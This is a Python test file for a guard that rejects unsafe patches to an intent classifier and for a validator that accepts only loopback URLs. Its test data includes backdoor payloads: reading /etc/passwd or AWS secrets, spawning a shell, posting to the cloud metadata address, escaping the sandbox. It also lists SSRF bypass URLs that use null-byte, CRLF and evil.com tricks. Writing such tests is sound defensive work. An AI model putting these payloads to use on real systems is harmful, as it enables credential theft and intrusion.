import unittest
from pathlib import Path

from eval_adversarial import loopback_base_url
from fix_classifier import _UnsafePatch, assert_patch_source_is_safe


ROOT = Path(__file__).resolve().parents[1]


class DevToolGuardTests(unittest.TestCase):
    def test_current_classifier_source_passes_the_patch_guard(self):
        source = (ROOT / "intent.py").read_text(encoding="utf-8")
        assert_patch_source_is_safe(source)

    def test_classification_strings_can_still_change(self):
        source = (ROOT / "intent.py").read_text(encoding="utf-8")
        updated = source.replace(
            "informational_question_not_schedule_request",
            "informational_question",
            1,
        )
        self.assertNotEqual(source, updated)
        assert_patch_source_is_safe(updated)

    def test_indirect_backdoors_are_rejected(self):
        source = (ROOT / "intent.py").read_text(encoding="utf-8")
        payloads = (
            "\ndef _exfil(text):\n    return open('/etc/passwd').read()\n",
            "\ndef _exfil(text):\n    return (lambda: __import__)()('os').system(text)\n",
            "\ndef _exfil(text):\n    return requests.Session().post('http://169.254.169.254/', data=text)\n",
            "\ndef _exfil(text):\n    os.execlp('sh', 'sh')\n",
            "\ndef _exfil(text):\n    os.environ['DUCKLING_URL'] = 'http://10.0.0.5:8000/parse'\n",
            "\ndef _exfil(text):\n    return os.environ.get('AWS_SECRET_ACCESS_KEY', '')\n",
            "\ndef _exfil(text):\n    return ().__class__.__bases__[0].__subclasses__()\n",
            "\ndef post_duckling(data, timeout, url=None):\n    return None\n",
        )
        for payload in payloads:
            with self.subTest(payload=payload.strip().splitlines()[-1]):
                with self.assertRaises(_UnsafePatch):
                    assert_patch_source_is_safe(source + payload)

    def test_redirect_flag_in_the_duckling_client_cannot_change(self):
        source = (ROOT / "intent.py").read_text(encoding="utf-8")
        updated = source.replace("allow_redirects=False", "allow_redirects=True", 1)
        self.assertNotEqual(source, updated)
        with self.assertRaises(_UnsafePatch):
            assert_patch_source_is_safe(updated)

    def test_generated_process_and_import_calls_are_rejected(self):
        samples = (
            "import os\ndef classify(text):\n    os.system(text)\n",
            "import subprocess\ndef classify(text):\n    return text\n",
            "import requests\ndef classify(text):\n    requests.get('http://169.254.169.254/')\n",
            "def classify(text):\n    return eval(text)\n",
        )
        for source in samples:
            with self.subTest(source=source.splitlines()[0]):
                with self.assertRaises(_UnsafePatch):
                    assert_patch_source_is_safe(source)

    def test_classifier_url_stays_on_loopback(self):
        self.assertEqual(
            "http://127.0.0.1:8080",
            loopback_base_url("http://127.0.0.1:8080/"),
        )
        self.assertEqual(
            "http://127.0.0.1:5000",
            loopback_base_url("http://localhost:5000"),
        )
        self.assertEqual(
            "http://[::1]:8080",
            loopback_base_url("http://[::1]:8080/"),
        )
        for url in (
            "http://169.254.169.254/",
            "http://example.com/v1",
            "http://10.0.0.5:8080",
            "file:///etc/passwd",
            "http://user:pass@127.0.0.1:8080",
            "http://127.0.0.1:8080/?next=http://evil",
            "http://127.0.0.1:8080%00.evil.com/",
            "http://127.0.0.1:8080%0d%0a/",
            "http://[::1]:8080%00.evil.com/",
            "http://127.0.0.1:08080/",
            "http://localhost.:5000/",
        ):
            with self.subTest(url=url):
                with self.assertRaises(RuntimeError):
                    loopback_base_url(url)
